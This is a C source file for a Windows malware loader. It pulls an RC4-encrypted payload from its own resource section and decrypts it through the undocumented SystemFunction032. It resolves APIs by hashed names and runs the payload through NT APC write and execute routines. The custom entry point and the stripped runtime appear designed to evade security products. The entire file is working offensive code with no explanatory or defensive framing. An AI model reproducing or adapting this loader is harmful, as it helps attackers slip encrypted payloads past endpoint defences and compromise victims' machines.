#include <Windows.h>
#include "Common.h"
#include "Debug.h"
#include "Resource.h"

#pragma comment(linker,"/ENTRY:main")


// needed to compile
extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
	unsigned char* p = (unsigned char*)pTarget;
	while (cbTarget-- > 0) {
		*p++ = (unsigned char)value;
	}
	return pTarget;
}



BOOL GetResourceData(IN HMODULE hModule, IN WORD ResourceId, OUT PVOID* ppResourceRawData, OUT PDWORD psResourceDataSize) {

	CHAR* pBaseAddr = (CHAR*)hModule;
	PIMAGE_DOS_HEADER 	pImgDosHdr = (PIMAGE_DOS_HEADER)pBaseAddr;
	PIMAGE_NT_HEADERS 	pImgNTHdr = (PIMAGE_NT_HEADERS)(pBaseAddr + pImgDosHdr->e_lfanew);
	PIMAGE_OPTIONAL_HEADER 	pImgOptionalHdr = (PIMAGE_OPTIONAL_HEADER)&pImgNTHdr->OptionalHeader;
	PIMAGE_DATA_DIRECTORY 	pDataDir = (PIMAGE_DATA_DIRECTORY)&pImgOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];

	PIMAGE_RESOURCE_DIRECTORY 	pResourceDir = NULL, pResourceDir2 = NULL, pResourceDir3 = NULL;
	PIMAGE_RESOURCE_DIRECTORY_ENTRY pResourceEntry = NULL, pResourceEntry2 = NULL, pResourceEntry3 = NULL;

	PIMAGE_RESOURCE_DATA_ENTRY 	pResource = NULL;


	pResourceDir = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress);
	pResourceEntry = (IMAGE_RESOURCE_DIRECTORY_ENTRY*)(pResourceDir + 1);


	for (size_t i = 0; i < (pResourceDir->NumberOfNamedEntries + pResourceDir->NumberOfIdEntries); i++) {

		if (pResourceEntry[i].DataIsDirectory == 0)
			break;

		pResourceDir2 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry[i].OffsetToDirectory & 0x7FFFFFFF));
		pResourceEntry2 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir2 + 1);

		if (pResourceEntry2->DataIsDirectory == 1 && pResourceEntry2->Id == ResourceId) {

			pResourceDir3 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry2->OffsetToDirectory & 0x7FFFFFFF));
			pResourceEntry3 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir3 + 1);

			pResource = (PIMAGE_RESOURCE_DATA_ENTRY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry3->OffsetToData & 0x7FFFFFFF));

			*ppResourceRawData = (PVOID)(pBaseAddr + (pResource->OffsetToData));
			*psResourceDataSize = pResource->Size;

			break;
		}

	}

	if (*ppResourceRawData != NULL && *psResourceDataSize != NULL)
		return TRUE;

	return FALSE;
}





typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;


typedef NTSTATUS(NTAPI* fnSystemFunction032)(

	struct USTRING* Img,
	struct USTRING* Key

	);


BOOL Rc4ViaSF032(PVOID pPayloadData, SIZE_T sPayloadSize, PBYTE pRc4Key, DWORD dwRc4KeySize) {

	NTSTATUS	STATUS = 0x00;
	USTRING		Key = { .Buffer = pRc4Key,			.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
				Img = { .Buffer = pPayloadData ,	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };

	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryH("ADVAPI32.DLL"), SystemFunction032_CRC32b);


	if (SystemFunction032 && (STATUS = SystemFunction032(&Img, &Key)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] SystemFunction032 FAILED With Error: 0x%0.8X (main.c:100)\n", STATUS);
#endif
		return FALSE;
	}

	return TRUE;

}



int main() {

	
	PVOID	pResourceRawData		= NULL, 
			pAddress				= NULL;

	DWORD	dwResourceDataSize		= 0x00;
	PBYTE	pHeap					= NULL;

	unsigned char Rc4Key [0x10]		= { 0 };


	if (!GetResourceData(GetModuleHandle(NULL), RSRC_PAYLOAD, &pResourceRawData, &dwResourceDataSize))
		return -1;

	if (!Initialize())
		return -1;

#ifdef DEBUG
	PRINTA("[i] pResourceRawData : 0x%p \n", pResourceRawData);
	PRINTA("[i] dwResourceDataSize : %0.8d bytes \n", dwResourceDataSize);
#endif // DEBUG



	// getting the rc4 key from the .rsrc section [first 16 byte] 
	_memcpy(Rc4Key, pResourceRawData, 0x10);								// copying the key
	pResourceRawData = (PVOID)((ULONG_PTR)pResourceRawData + 0x10);			// updating payload base address [skipping the key's bytes]
	dwResourceDataSize = dwResourceDataSize - 0x10;
	pHeap = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwResourceDataSize);
	if (pHeap)
		_memcpy(pHeap, pResourceRawData, dwResourceDataSize);


	// printing info
#ifdef DEBUG
	PRINTA("[i] Rc4 Key : [ ");
	for (int i = 0; i < 0x10; i++)
		PRINTA("%02X ", Rc4Key[i]);
	PRINTA("]\n");

	PRINTA("[+] Decrypted Buffer Allocated At : 0x%p \n", pHeap);
#endif // DEBUG



	if (!Rc4ViaSF032(pHeap, dwResourceDataSize, Rc4Key, sizeof(Rc4Key)))
		return -1;


	if (!NtApcWrite(pHeap, dwResourceDataSize, &pAddress))
		return -1;


	_ZeroMemory(pHeap, dwResourceDataSize);
	HeapFree(GetProcessHeap(), 0, (PVOID)pHeap);

	if (pAddress && !RunViaNtApc(pAddress))
		return -1;

	return 0;
}








